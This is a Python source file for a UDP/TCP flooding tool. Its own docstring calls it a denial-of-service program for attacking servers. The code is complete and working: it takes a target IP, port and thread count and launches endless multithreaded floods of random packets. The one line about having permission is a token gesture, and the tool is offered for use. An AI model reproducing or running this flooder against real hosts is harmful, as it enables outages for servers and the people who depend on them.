"""
UDP Flooder.
This is a DOS attack program to attack servers. You set the IP that you have permission 
to do it, the port, the amount of seconds and it will start flooding to that server.
Created by Xavi Fortes -> https://github.com/XaviFortes/Python-UDP-Flood
Usage : ./flood_udp
"""


import random
import signal
import socket
import sys
import threading
from os import name, system

print("\033[1;34;40m \n")
system("figlet DDOS ATTACK -f slant")
print(
    "\033[1;33;40m If you have any issue post a thread on https://github.com/XaviFortes/Python-UDP-Flood/issues\n"
)

print("\033[1;32;40m ==> Code by Karasu <==  \n")
ip = str(input("Host/Ip: "))
port = int(input("Port: "))
choice = str(input("UDP (y/n): "))
times = int(input("Packets per one connection: "))
threads = int(input("Threads: "))


def udp():
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP = SOCK_DGRAM
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, addr)
            print(i + "UDP Sent!!!")
        except Exception as err:
            s.close()
            print(f"[!] {err}!!!")


def tcp():
    data = random._urandom(16)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP = SOCK_STREAM
            s.connect((ip, port))
            s.send(data)
            for _ in range(times):
                s.send(data)
            print(i + "TCP Sent!!!")
        except Exception as err:
            s.close()
            print(f"[*] {err}!!!")


for _ in range(threads):
    if choice == "y":
        th = threading.Thread(target=udp)
        th.start()
    else:
        th = threading.Thread(target=tcp)
        th.start()


def new():
    for _ in range(threads):
        if choice == "y":
            th = threading.Thread(target=udp)
            th.start()
        else:
            th = threading.Thread(target=tcp)
            th.start()


def whereuwere():
    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
    print("Put 1 for UDP and 2 for TCP")
    whereman = str(input("1 or 2 >:("))
    if whereman == "1":
        udp()
    else:
        tcp()


def byebye():
    system("cls" if name == "nt" else "clear")
    system("figlet Youre Leaving Sir -f slant")
    sys.exit(130)


def exit_gracefully():
    # restore the original signal handler
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input("You wanna exit bby <3 ?:"))
        if exitc == "y":
            byebye()

    except KeyboardInterrupt:
        print("Ok ok")
        byebye()

    # restore the gracefully exit handler
    signal.signal(signal.SIGINT, exit_gracefully)


if __name__ == "__main__":
    # store SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
